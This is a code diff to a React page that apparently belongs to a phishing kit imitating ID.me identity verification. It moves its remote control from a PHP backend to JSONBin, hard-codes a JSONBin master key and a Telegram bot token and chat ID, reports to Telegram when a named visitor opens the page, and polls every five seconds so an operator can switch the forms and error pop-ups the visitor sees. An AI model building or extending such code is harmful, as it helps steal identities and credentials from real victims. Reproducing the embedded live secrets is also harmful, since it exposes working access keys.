@@ -20,11 +20,14 @@ import CreateAccount from "../components/createIDMeNew";
 import SecondErrorPage from "../components/secondErrorPage";
 import WeAreVeryfying from "../components/weareveryfying";
 
-// The URL for your PHP backend
-const API_URL =
-  "https://olive-tapir-759483.hostingersite.com/myBackend/admin_api7.php"; // Update this based on your server configuration
+const BIN_ID = "6a340b1dda38895dfed7e840";
+const API_KEY = "$2a$10$qrNF.b6EVU4HN2N8Dvegaez/mp2L7ZO9EjET5ujsIiWNSfuOyB.mu";
+ // Update this based on your server configuration
 const BOT_TOKEN = "8367580298:AAEDM4WkitJScciFNTpoBmm9RvHEQEFj-e4";
 const CHAT_ID = "-4986888800";
+
+
+const API_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
 
 const UserPage2 = () => {
   const [formType, setFormType] = useState<string>("");
@@ -38,10 +41,16 @@ const UserPage2 = () => {
   useEffect(() => {
     const fetchFormType = async () => {
       try {
-        const res = await fetch(`${API_URL}?action=fetch_forms2`);
-        const data = await res.json();
-        const selectedForm = data?.currentForm2 || "LandingPage";
-        setFormType(selectedForm);
+       const res = await fetch(API_URL + "/latest", {
+  headers: {
+    "X-Master-Key": API_KEY,
+  },
+});
+
+const data = await res.json();
+const selectedForm = data.record.currentForm2 || "LandingPage";
+
+setFormType(selectedForm);
       } catch (error) {
         console.error("Failed to fetch form type from PHP:", error);
       }
@@ -67,34 +76,50 @@ const UserPage2 = () => {
     sendToTelegram(`✅ ${fullName} has opened the user 2 page. and refreshed`);
   }, []);
 
-  useEffect(() => {
-    const interval = setInterval(() => {
-      fetch(`${API_URL}?action=get_popup_statusu2`)
-        .then((res) => res.json())
-        .then((data) => {
-          if (data.showPopupu2) setShowPopupu2(true);
-          // Optional: close popup when it's false
-          else setShowPopupu2(false);
-        });
-    }, 5000); // every 5 seconds
+  // useEffect(() => {
+  //   const interval = setInterval(() => {
+  //     fetch(`${API_URL}?action=get_popup_statusu2`)
+  //       .then((res) => res.json())
+  //       .then((data) => {
+  //         if (data.showPopupu2) setShowPopupu2(true);
+  //         // Optional: close popup when it's false
+  //         else setShowPopupu2(false);
+  //       });
+  //   }, 5000); // every 5 seconds
 
-    return () => clearInterval(interval); // cleanup on unmount
-  }, []);
+  //   return () => clearInterval(interval); // cleanup on unmount
+  // }, []);
 
   // Fetch the popup status from the PHP backend
-  useEffect(() => {
-    const fetchPopupStatus = async () => {
-      try {
-        const res = await fetch(`${API_URL}?action=fetch_error_content`);
-        const data = await res.json();
-        setShowPopupu2(data?.showPopupu2 || false); // Assuming the backend returns the showPopup flag
-      } catch (error) {
-        console.error("Failed to fetch popup status from PHP:", error);
-      }
-    };
-
-    fetchPopupStatus();
-  }, []);
+ useEffect(() => {
+   const fetchPopupStatus = async () => {
+     try {
+       const res = await fetch(`${API_URL}/latest`, {
+         headers: {
+           "X-Master-Key": API_KEY,
+         },
+       });
+ 
+       if (!res.ok) {
+         throw new Error("Failed to fetch JSONBin");
+       }
+ 
+       const data = await res.json();
+ 
+       setShowPopupu2(data.record.showPopupu2 ?? false);
+     } catch (error) {
+       console.error(error);
+     }
+   };
+ 
+   // Initial fetch
+   fetchPopupStatus();
+ 
+   // Poll every 5 seconds
+   const interval = setInterval(fetchPopupStatus, 5000);
+ 
+   return () => clearInterval(interval);
+ }, []);
 
   const renderForm = () => {
     switch (formType) {
@@ -151,25 +176,42 @@ const UserPage2 = () => {
   };
 
   const handlePopupDismiss = async () => {
-    try {
-      // Update the backend to set the popup to false
-      await fetch(`${API_URL}?action=update_popupu2`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ showPopup: false }),
-      });
+  try {
+    // Get the current JSONBin record
+    const res = await fetch(`${API_URL}/latest`, {
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+      },
+    });
 
-      // Hide the popup immediately
-      setShowPopupu2(false);
+    const { record } = await res.json();
 
-      // Refresh the page after dismissing the popup
-      window.location.reload(); // This will reload the page
-    } catch (error) {
-      console.error("Error updating popup status:", error);
-    }
-  };
+    // Update the showPopup field
+    const updatedRecord = {
+      ...record,
+      showPopupu2: false,
+    };
+
+    // Save the updated record back to JSONBin
+    await fetch(API_URL, {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+      },
+      body: JSON.stringify(updatedRecord),
+    });
+
+    // Update local state
+    setShowPopupu2(false);
+
+    // Refresh the page if needed
+    window.location.reload();
+  } catch (error) {
+    console.error("Error updating popup status:", error);
+  }
+};
 
   return (
     <div>
